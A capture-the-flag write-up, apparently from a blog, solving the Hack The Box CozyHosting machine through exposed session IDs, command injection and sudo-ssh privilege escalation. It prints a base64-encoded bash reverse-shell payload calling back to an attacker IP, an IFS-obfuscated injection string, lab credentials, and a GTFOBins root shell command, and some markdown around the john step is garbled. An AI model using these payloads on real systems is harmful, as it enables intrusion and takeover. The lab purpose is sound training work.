---
title: Hack The Box - CozyHosting
date: 2024-05-06 13:33:37 +0200
categories:
  - HTB
tags:
  - HTB
comments: true
---

HTB CozyHosting Machine - https://www.hackthebox.com/machines/cozyhosting

### Scanning & Enumeration
Scanning the HTB machine with Nmap tool
```
sudo nmap -sC -sV -sS 10.10.11.230
```

![](assets/img/posts/pasted-image-20260820071953.png))

We will see a redirect made on port 80, so add this host to `/etc/hosts`
```
echo "10.10.11.230" cozyhosting.htb | sudo tee -a /etc/hosts
```

Visiting this page, it becomes clear that there is nothing captivating apart from the Login feature. So we tried to fuzz the directories enabled on this site.
```
dirsearch -u http://cozyhosting.htb
```

![](assets/img/posts/20250816234657.png))

During this directory fuzzing, we found a directory: `/actuator/sessions` , so lets visit it: http://cozyhosting.htb/actuator/sessions

![](assets/img/posts/20250816234707.png))

 It contains JESSIONIDs of the users
 
So we will try to to logged in by replacing our JESSIONID with this JESSIONIDs

![](assets/img/posts/20250816234737.png))

We successfully logged in !
 
Now, on this dashboard we found that there was a functionality running which serves an SSH connection to it's users.

![](assets/img/posts/20250816234745.png))

 
The SSH connection settings form at the bottom of the admin page is interesting. Entering the attacker's IP address and a username, burp reveals a POST is sent to `/executessh`

![](assets/img/posts/20250816234753.png))

This just seems to timeout and no connection is established with the attacker's IP

Trying different things:
- leaving the username blank, the SSH command help is displayed in the response.

Can it be that simple? Command injection may be the way into the target.

![](assets/img/posts/20250816234809.png))

After that, we tried to send the username with single quote `test'`

![](assets/img/posts/20250816234817.png))

 Its shows that there was an error created during the `/bin/bash -c`  execution process.

Now, we made our own payload which will give a reverse shell while executed by the machine.
```
echo "bash -i >& /dev/tcp/10.10.16.10/9001 0>&1" | base64 -w 0            
```

Then URL encode it, and it will looks like: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMC85MDAxIDA+JjEK`

![](assets/img/posts/20250816234825.png))


First, start a listener on our machine.
```
nc -nvlp 9001
```

Second, we will send this payload as the username with URL encoded & 
```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;     // use this

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMC85MDAxIDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;    // or this
```

We got a shell !

Now it's time to make this shell stable !
```
app@cozyhosting:/app$ python3 -c \'import pty;pty.spawn(\"/bin/bash\")\'
app@cozyhosting:/app$ export TERM=xterm
app@cozyhosting:/app$ ctrl + z
app@cozyhosting:/app$ stty raw -echo; fg
```

![](assets/img/posts/20250816234833.png))

We found `cloudhosting-0.0.1.jar` file, lets take it to our machine

First, from the HTB machine
```
app@cozyhosting:/app$ python3 -m http.server 4444
```

Second, from our kali machine
```
wget http://10.10.11.230:4444/cloudhosting-0.0.1.jar
```

We opened this file using `jd-gui` , and got the PostgreSQL database's username: `postgres` & password: `Vg&nvzAQ7XxR`
```
jd-gui cloudhosting-0.0.1.jar
```

![](assets/img/posts/20250816234841.png))

We successfully logged into the PostgreSQL database using these username and password.
```
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password: Vg&nvzAQ7XxR

postgres=# c cozyhosting           # connect to database of cozyhosting
postgres=# d
postgres=# select * from users;
```

![](assets/img/posts/pasted-image-20260820074216-.png))

We cracked this password using john tool`pasted-image-20260820074216.png`ou.txt
```
Result: `manchesterunited`

We also find a user named `josh` in `/etc/passwd`
```
cat /etc/passwd
```

Now using the new username and password we found
```
ssh josh@10.10.11.230
password: manchesterunited

josh@cozyhosting:~$ whoami
josh@cozyhosting:~$ ls
josh@cozyhosting:~$ cat user.txt
```

### Privilege Escalation
Lets see what we can run as a sudo without a password
```
josh@cozyhosting:~$ sudo -l
Password: manchesterunited
```
User josh may run the following commands on localhost:
	`(root) /usr/bin/ssh *`

After searching in google, there is a simple payload at GTFOBINS which successfully allows us to get the shell as root
	https://gtfobins.github.io/gtfobins/ssh/#sudo

```
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
cd /root
cat root.txt
```